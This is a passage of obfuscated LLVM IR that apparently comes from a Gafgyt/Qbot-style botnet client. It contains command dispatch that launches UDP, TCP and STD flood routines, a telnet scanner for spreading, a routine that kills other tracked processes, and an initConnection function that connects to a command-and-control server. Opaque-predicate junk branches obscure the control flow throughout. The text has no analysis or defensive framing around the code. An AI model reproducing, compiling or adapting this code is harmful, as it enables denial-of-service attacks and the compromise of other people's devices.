  %1158 = getelementptr inbounds i8*, i8** %1157, i64 3
  %1159 = load i8*, i8** %1158, align 8
  %1160 = call i32 @atoi(i8* %1159) #10
  store i32 %1160, i32* %34, align 4
  %1161 = load i8*, i8** %32, align 8
  %1162 = call i8* @strstr(i8* %1161, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %1163 = icmp ne i8* %1162, null
  %1164 = load i32, i32* @x.81
  %1165 = load i32, i32* @y.82
  %1166 = sub i32 %1164, 1
  %1167 = mul i32 %1164, %1166
  %1168 = urem i32 %1167, 2
  %1169 = icmp eq i32 %1168, 0
  %1170 = icmp slt i32 %1165, 10
  %1171 = or i1 %1169, %1170
  br i1 %1171, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1163, label %1172, label %1236

; <label>:1172:                                   ; preds = %originalBBpart2152
  %1173 = load i32, i32* @x.81
  %1174 = load i32, i32* @y.82
  %1175 = sub i32 %1173, 1
  %1176 = mul i32 %1173, %1175
  %1177 = urem i32 %1176, 2
  %1178 = icmp eq i32 %1177, 0
  %1179 = icmp slt i32 %1174, 10
  %1180 = or i1 %1178, %1179
  br i1 %1180, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1172
  %1181 = load i8*, i8** %32, align 8
  %1182 = call i8* @strtok(i8* %1181, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %1182, i8** %35, align 8
  %1183 = load i32, i32* @x.81
  %1184 = load i32, i32* @y.82
  %1185 = sub i32 %1183, 1
  %1186 = mul i32 %1183, %1185
  %1187 = urem i32 %1186, 2
  %1188 = icmp eq i32 %1187, 0
  %1189 = icmp slt i32 %1184, 10
  %1190 = or i1 %1188, %1189
  br i1 %1190, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1191

; <label>:1191:                                   ; preds = %1217, %originalBBpart2156
  %1192 = load i8*, i8** %35, align 8
  %1193 = icmp ne i8* %1192, null
  br i1 %1193, label %1194, label %1219

; <label>:1194:                                   ; preds = %1191
  %1195 = call i32 @listFork()
  %1196 = icmp ne i32 %1195, 0
  br i1 %1196, label %1217, label %1197

; <label>:1197:                                   ; preds = %1194
  %1198 = load i32, i32* @x.81
  %1199 = load i32, i32* @y.82
  %1200 = sub i32 %1198, 1
  %1201 = mul i32 %1198, %1200
  %1202 = urem i32 %1201, 2
  %1203 = icmp eq i32 %1202, 0
  %1204 = icmp slt i32 %1199, 10
  %1205 = or i1 %1203, %1204
  br i1 %1205, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1197
  %1206 = load i8*, i8** %35, align 8
  %1207 = load i32, i32* %33, align 4
  %1208 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %1206, i32 %1207, i32 %1208)
  call void @_exit(i32 0) #12
  %1209 = load i32, i32* @x.81
  %1210 = load i32, i32* @y.82
  %1211 = sub i32 %1209, 1
  %1212 = mul i32 %1209, %1211
  %1213 = urem i32 %1212, 2
  %1214 = icmp eq i32 %1213, 0
  %1215 = icmp slt i32 %1210, 10
  %1216 = or i1 %1214, %1215
  br i1 %1216, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  unreachable

; <label>:1217:                                   ; preds = %1194
  %1218 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %1218, i8** %35, align 8
  br label %1191

; <label>:1219:                                   ; preds = %1191
  %1220 = load i32, i32* @x.81
  %1221 = load i32, i32* @y.82
  %1222 = sub i32 %1220, 1
  %1223 = mul i32 %1220, %1222
  %1224 = urem i32 %1223, 2
  %1225 = icmp eq i32 %1224, 0
  %1226 = icmp slt i32 %1221, 10
  %1227 = or i1 %1225, %1226
  br i1 %1227, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1219
  %1228 = load i32, i32* @x.81
  %1229 = load i32, i32* @y.82
  %1230 = sub i32 %1228, 1
  %1231 = mul i32 %1228, %1230
  %1232 = urem i32 %1231, 2
  %1233 = icmp eq i32 %1232, 0
  %1234 = icmp slt i32 %1229, 10
  %1235 = or i1 %1233, %1234
  br i1 %1235, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1244

; <label>:1236:                                   ; preds = %originalBBpart2152
  %1237 = call i32 @listFork()
  %1238 = icmp ne i32 %1237, 0
  br i1 %1238, label %1239, label %1240

; <label>:1239:                                   ; preds = %1236
  br label %1358

; <label>:1240:                                   ; preds = %1236
  %1241 = load i8*, i8** %32, align 8
  %1242 = load i32, i32* %33, align 4
  %1243 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %1241, i32 %1242, i32 %1243)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1244:                                   ; preds = %originalBBpart2164
  br label %1245

; <label>:1245:                                   ; preds = %1244, %1087
  %1246 = load i32, i32* @x.81
  %1247 = load i32, i32* @y.82
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1245
  %1254 = load i8**, i8*** %4, align 8
  %1255 = getelementptr inbounds i8*, i8** %1254, i64 0
  %1256 = load i8*, i8** %1255, align 8
  %1257 = call i32 @strcmp(i8* %1256, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.110, i32 0, i32 0)) #10
  %1258 = icmp ne i32 %1257, 0
  %1259 = load i32, i32* @x.81
  %1260 = load i32, i32* @y.82
  %1261 = sub i32 %1259, 1
  %1262 = mul i32 %1259, %1261
  %1263 = urem i32 %1262, 2
  %1264 = icmp eq i32 %1263, 0
  %1265 = icmp slt i32 %1260, 10
  %1266 = or i1 %1264, %1265
  br i1 %1266, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br i1 %1258, label %1335, label %1267

; <label>:1267:                                   ; preds = %originalBBpart2168
  %1268 = load i32, i32* @x.81
  %1269 = load i32, i32* @y.82
  %1270 = sub i32 %1268, 1
  %1271 = mul i32 %1268, %1270
  %1272 = urem i32 %1271, 2
  %1273 = icmp eq i32 %1272, 0
  %1274 = icmp slt i32 %1269, 10
  %1275 = or i1 %1273, %1274
  br i1 %1275, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1267
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  %1276 = load i32, i32* @x.81
  %1277 = load i32, i32* @y.82
  %1278 = sub i32 %1276, 1
  %1279 = mul i32 %1276, %1278
  %1280 = urem i32 %1279, 2
  %1281 = icmp eq i32 %1280, 0
  %1282 = icmp slt i32 %1277, 10
  %1283 = or i1 %1281, %1282
  br i1 %1283, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %1284

; <label>:1284:                                   ; preds = %1326, %originalBBpart2172
  %1285 = load i64, i64* %37, align 8
  %1286 = load i64, i64* @numpids, align 8
  %1287 = icmp ult i64 %1285, %1286
  br i1 %1287, label %1288, label %1329

; <label>:1288:                                   ; preds = %1284
  %1289 = load i32*, i32** @pids, align 8
  %1290 = load i64, i64* %37, align 8
  %1291 = getelementptr inbounds i32, i32* %1289, i64 %1290
  %1292 = load i32, i32* %1291, align 4
  %1293 = icmp ne i32 %1292, 0
  br i1 %1293, label %1294, label %1325

; <label>:1294:                                   ; preds = %1288
  %1295 = load i32, i32* @x.81
  %1296 = load i32, i32* @y.82
  %1297 = sub i32 %1295, 1
  %1298 = mul i32 %1295, %1297
  %1299 = urem i32 %1298, 2
  %1300 = icmp eq i32 %1299, 0
  %1301 = icmp slt i32 %1296, 10
  %1302 = or i1 %1300, %1301
  br i1 %1302, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1294
  %1303 = load i32*, i32** @pids, align 8
  %1304 = load i64, i64* %37, align 8
  %1305 = getelementptr inbounds i32, i32* %1303, i64 %1304
  %1306 = load i32, i32* %1305, align 4
  %1307 = call i32 @getpid() #2
  %1308 = icmp ne i32 %1306, %1307
  %1309 = load i32, i32* @x.81
  %1310 = load i32, i32* @y.82
  %1311 = sub i32 %1309, 1
  %1312 = mul i32 %1309, %1311
  %1313 = urem i32 %1312, 2
  %1314 = icmp eq i32 %1313, 0
  %1315 = icmp slt i32 %1310, 10
  %1316 = or i1 %1314, %1315
  br i1 %1316, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1308, label %1317, label %1325

; <label>:1317:                                   ; preds = %originalBBpart2176
  %1318 = load i32*, i32** @pids, align 8
  %1319 = load i64, i64* %37, align 8
  %1320 = getelementptr inbounds i32, i32* %1318, i64 %1319
  %1321 = load i32, i32* %1320, align 4
  %1322 = call i32 @kill(i32 %1321, i32 9) #2
  %1323 = load i32, i32* %36, align 4
  %1324 = add nsw i32 %1323, 1
  store i32 %1324, i32* %36, align 4
  br label %1325

; <label>:1325:                                   ; preds = %1317, %originalBBpart2176, %1288
  br label %1326

; <label>:1326:                                   ; preds = %1325
  %1327 = load i64, i64* %37, align 8
  %1328 = add i64 %1327, 1
  store i64 %1328, i64* %37, align 8
  br label %1284

; <label>:1329:                                   ; preds = %1284
  %1330 = load i32, i32* %36, align 4
  %1331 = icmp sgt i32 %1330, 0
  br i1 %1331, label %1332, label %1333

; <label>:1332:                                   ; preds = %1329
  br label %1334

; <label>:1333:                                   ; preds = %1329
  br label %1334

; <label>:1334:                                   ; preds = %1333, %1332
  br label %1335

; <label>:1335:                                   ; preds = %1334, %originalBBpart2168
  %1336 = load i32, i32* @x.81
  %1337 = load i32, i32* @y.82
  %1338 = sub i32 %1336, 1
  %1339 = mul i32 %1336, %1338
  %1340 = urem i32 %1339, 2
  %1341 = icmp eq i32 %1340, 0
  %1342 = icmp slt i32 %1337, 10
  %1343 = or i1 %1341, %1342
  br i1 %1343, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1335
  %1344 = load i8**, i8*** %4, align 8
  %1345 = getelementptr inbounds i8*, i8** %1344, i64 0
  %1346 = load i8*, i8** %1345, align 8
  %1347 = call i32 @strcmp(i8* %1346, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0)) #10
  %1348 = icmp ne i32 %1347, 0
  %1349 = load i32, i32* @x.81
  %1350 = load i32, i32* @y.82
  %1351 = sub i32 %1349, 1
  %1352 = mul i32 %1349, %1351
  %1353 = urem i32 %1352, 2
  %1354 = icmp eq i32 %1353, 0
  %1355 = icmp slt i32 %1350, 10
  %1356 = or i1 %1354, %1355
  br i1 %1356, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br i1 %1348, label %1358, label %1357

; <label>:1357:                                   ; preds = %originalBBpart2180
  call void @exit(i32 0) #14
  unreachable

; <label>:1358:                                   ; preds = %originalBBpart2180, %1239, %1140, %1081, %originalBBpart2132, %913, %originalBBpart2104, %753, %607, %531, %411, %272, %originalBBpart228, %212, %184, %originalBBpart212, %originalBBpart28, %110, %82, %52, %43
  %1359 = load i32, i32* @x.81
  %1360 = load i32, i32* @y.82
  %1361 = sub i32 %1359, 1
  %1362 = mul i32 %1359, %1361
  %1363 = urem i32 %1362, 2
  %1364 = icmp eq i32 %1363, 0
  %1365 = icmp slt i32 %1360, 10
  %1366 = or i1 %1364, %1365
  br i1 %1366, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1358
  %1367 = load i32, i32* @x.81
  %1368 = load i32, i32* @y.82
  %1369 = sub i32 %1367, 1
  %1370 = mul i32 %1367, %1369
  %1371 = urem i32 %1370, 2
  %1372 = icmp eq i32 %1371, 0
  %1373 = icmp slt i32 %1368, 10
  %1374 = or i1 %1372, %1373
  br i1 %1374, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %57
  %1375 = load i8**, i8*** %4, align 8
  %1376 = getelementptr inbounds i8*, i8** %1375, i64 0
  %1377 = load i8*, i8** %1376, align 8
  %1378 = call i32 @strcmp(i8* %1377, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.97, i32 0, i32 0)) #10
  %1379 = icmp ne i32 %1378, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %85
  %1380 = load i8**, i8*** %4, align 8
  %1381 = getelementptr inbounds i8*, i8** %1380, i64 1
  %1382 = load i8*, i8** %1381, align 8
  %1383 = call i32 @strcmp(i8* %1382, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.99, i32 0, i32 0)) #10
  %1384 = icmp ne i32 %1383, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %124
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %147
  %1385 = load i32, i32* %6, align 4
  store i32 %1385, i32* @scanPid, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %165
  %1386 = load i32, i32* %6, align 4
  %1387 = icmp eq i32 %1386, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %186
  call void (i32, ...) bitcast (void ()* @TelnetScanner to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %213
  %1388 = call i32 @fork() #2
  store i32 %1388, i32* %7, align 4
  %1389 = load i32, i32* @mainCommSock, align 4
  %1390 = call i32 (i32, i8*, ...) @sockprintf(i32 %1389, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.104, i32 0, i32 0))
  %1391 = load i32, i32* %7, align 4
  %1392 = icmp ugt i32 %1391, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %235
  %1393 = load i32, i32* %7, align 4
  store i32 %1393, i32* @scanPid, align 4
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %253
  %1394 = load i32, i32* %7, align 4
  %1395 = icmp eq i32 %1394, -1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %273
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %291
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %330
  %1396 = load i8**, i8*** %4, align 8
  %1397 = getelementptr inbounds i8*, i8** %1396, i64 4
  %1398 = load i8*, i8** %1397, align 8
  %1399 = call i32 @atoi(i8* %1398) #10
  %1400 = icmp eq i32 %1399, -1
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %352
  %1401 = load i8**, i8*** %4, align 8
  %1402 = getelementptr inbounds i8*, i8** %1401, i64 5
  %1403 = load i8*, i8** %1402, align 8
  %1404 = call i32 @atoi(i8* %1403) #10
  %1405 = icmp eq i32 %1404, -1
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %374
  %1406 = load i8**, i8*** %4, align 8
  %1407 = getelementptr inbounds i8*, i8** %1406, i64 5
  %1408 = load i8*, i8** %1407, align 8
  %1409 = call i32 @atoi(i8* %1408) #10
  %1410 = icmp sgt i32 %1409, 65500
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %434
  %1411 = load i8**, i8*** %4, align 8
  %1412 = getelementptr inbounds i8*, i8** %1411, i64 6
  %1413 = load i8*, i8** %1412, align 8
  %1414 = call i32 @atoi(i8* %1413) #10
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %456
  store i32 %457, i32* %13, align 4
  %1415 = load i8*, i8** %8, align 8
  %1416 = call i8* @strstr(i8* %1415, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %1417 = icmp ne i8* %1416, null
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %477
  %1418 = load i8*, i8** %8, align 8
  %1419 = call i8* @strtok(i8* %1418, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %1419, i8** %14, align 8
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %502
  %1420 = load i8*, i8** %14, align 8
  %1421 = load i32, i32* %9, align 4
  %1422 = load i32, i32* %10, align 4
  %1423 = load i32, i32* %11, align 4
  %1424 = load i32, i32* %12, align 4
  %1425 = load i32, i32* %13, align 4
  call void @sendUDP(i8* %1420, i32 %1421, i32 %1422, i32 %1423, i32 %1424, i32 %1425)
  call void @_exit(i32 0) #12
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %549
  %1426 = load i8**, i8*** %4, align 8
  %1427 = getelementptr inbounds i8*, i8** %1426, i64 3
  %1428 = load i8*, i8** %1427, align 8
  %1429 = call i32 @atoi(i8* %1428) #10
  %1430 = icmp eq i32 %1429, -1
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %608
  %1431 = load i8**, i8*** %4, align 8
  %1432 = getelementptr inbounds i8*, i8** %1431, i64 1
  %1433 = load i8*, i8** %1432, align 8
  store i8* %1433, i8** %15, align 8
  %1434 = load i8**, i8*** %4, align 8
  %1435 = getelementptr inbounds i8*, i8** %1434, i64 2
  %1436 = load i8*, i8** %1435, align 8
  %1437 = call i32 @atoi(i8* %1436) #10
  store i32 %1437, i32* %16, align 4
  %1438 = load i8**, i8*** %4, align 8
  %1439 = getelementptr inbounds i8*, i8** %1438, i64 3
  %1440 = load i8*, i8** %1439, align 8
  %1441 = call i32 @atoi(i8* %1440) #10
  store i32 %1441, i32* %17, align 4
  %1442 = load i8**, i8*** %4, align 8
  %1443 = getelementptr inbounds i8*, i8** %1442, i64 4
  %1444 = load i8*, i8** %1443, align 8
  %1445 = call i32 @atoi(i8* %1444) #10
  store i32 %1445, i32* %18, align 4
  %1446 = load i8**, i8*** %4, align 8
  %1447 = getelementptr inbounds i8*, i8** %1446, i64 5
  %1448 = load i8*, i8** %1447, align 8
  store i8* %1448, i8** %19, align 8
  %1449 = load i32, i32* %3, align 4
  %1450 = icmp eq i32 %1449, 8
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %651
  store i32 %652, i32* %20, align 4
  %1451 = load i32, i32* %3, align 4
  %1452 = icmp sgt i32 %1451, 6
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %677
  store i32 %678, i32* %21, align 4
  %1453 = load i8*, i8** %15, align 8
  %1454 = call i8* @strstr(i8* %1453, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %1455 = icmp ne i8* %1454, null
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %707
  %1456 = load i8*, i8** %22, align 8
  %1457 = load i32, i32* %16, align 4
  %1458 = load i32, i32* %17, align 4
  %1459 = load i32, i32* %18, align 4
  %1460 = load i8*, i8** %19, align 8
  %1461 = load i32, i32* %21, align 4
  %1462 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %1456, i32 %1457, i32 %1458, i32 %1459, i8* %1460, i32 %1461, i32 %1462)
  call void @_exit(i32 0) #12
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %734
  %1463 = call i32 @listFork()
  %1464 = icmp ne i32 %1463, 0
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %769
  %1465 = load i32, i32* %3, align 4
  %1466 = icmp slt i32 %1465, 3
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %788
  %1467 = load i8**, i8*** %4, align 8
  %1468 = getelementptr inbounds i8*, i8** %1467, i64 2
  %1469 = load i8*, i8** %1468, align 8
  %1470 = call i32 @atoi(i8* %1469) #10
  %1471 = icmp slt i32 %1470, 1
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %810
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %838
  %1472 = load i8*, i8** %23, align 8
  %1473 = call i8* @strtok(i8* %1472, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %1473, i8** %25, align 8
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %877
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %894
  %1474 = call i32 @listFork()
  %1475 = icmp ne i32 %1474, 0
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %915
  %1476 = load i32, i32* %27, align 4
  %1477 = icmp slt i32 %1476, 10
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %949
  %1478 = load i32, i32* %3, align 4
  %1479 = icmp slt i32 %1478, 4
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %974
  %1480 = load i8**, i8*** %4, align 8
  %1481 = getelementptr inbounds i8*, i8** %1480, i64 3
  %1482 = load i8*, i8** %1481, align 8
  %1483 = call i32 @atoi(i8* %1482) #10
  %1484 = icmp slt i32 %1483, 1
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %996
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1034
  %1485 = call i32 @listFork()
  %1486 = icmp ne i32 %1485, 0
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1059
  %1487 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %1487, i8** %31, align 8
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1093
  %1488 = load i32, i32* %3, align 4
  %1489 = icmp slt i32 %1488, 4
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1112
  %1490 = load i8**, i8*** %4, align 8
  %1491 = getelementptr inbounds i8*, i8** %1490, i64 2
  %1492 = load i8*, i8** %1491, align 8
  %1493 = call i32 @atoi(i8* %1492) #10
  %1494 = icmp slt i32 %1493, 1
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1141
  %1495 = load i8**, i8*** %4, align 8
  %1496 = getelementptr inbounds i8*, i8** %1495, i64 1
  %1497 = load i8*, i8** %1496, align 8
  store i8* %1497, i8** %32, align 8
  %1498 = load i8**, i8*** %4, align 8
  %1499 = getelementptr inbounds i8*, i8** %1498, i64 2
  %1500 = load i8*, i8** %1499, align 8
  %1501 = call i32 @atoi(i8* %1500) #10
  store i32 %1501, i32* %33, align 4
  %1502 = load i8**, i8*** %4, align 8
  %1503 = getelementptr inbounds i8*, i8** %1502, i64 3
  %1504 = load i8*, i8** %1503, align 8
  %1505 = call i32 @atoi(i8* %1504) #10
  store i32 %1505, i32* %34, align 4
  %1506 = load i8*, i8** %32, align 8
  %1507 = call i8* @strstr(i8* %1506, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %1508 = icmp ne i8* %1507, null
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1172
  %1509 = load i8*, i8** %32, align 8
  %1510 = call i8* @strtok(i8* %1509, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %1510, i8** %35, align 8
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1197
  %1511 = load i8*, i8** %35, align 8
  %1512 = load i32, i32* %33, align 4
  %1513 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %1511, i32 %1512, i32 %1513)
  call void @_exit(i32 0) #12
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1219
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1245
  %1514 = load i8**, i8*** %4, align 8
  %1515 = getelementptr inbounds i8*, i8** %1514, i64 0
  %1516 = load i8*, i8** %1515, align 8
  %1517 = call i32 @strcmp(i8* %1516, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.110, i32 0, i32 0)) #10
  %1518 = icmp ne i32 %1517, 0
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1267
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1294
  %1519 = load i32*, i32** @pids, align 8
  %1520 = load i64, i64* %37, align 8
  %1521 = getelementptr inbounds i32, i32* %1519, i64 %1520
  %1522 = load i32, i32* %1521, align 4
  %1523 = call i32 @getpid() #2
  %1524 = icmp ne i32 %1522, %1523
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1335
  %1525 = load i8**, i8*** %4, align 8
  %1526 = getelementptr inbounds i8*, i8** %1525, i64 0
  %1527 = load i8*, i8** %1526, align 8
  %1528 = call i32 @strcmp(i8* %1527, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0)) #10
  %1529 = icmp ne i32 %1528, 0
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1358
  br label %originalBB182
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #2
  store i32 443, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.85
  %17 = load i32, i32* @y.86
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %1, align 4
  %24 = load i32, i32* @x.85
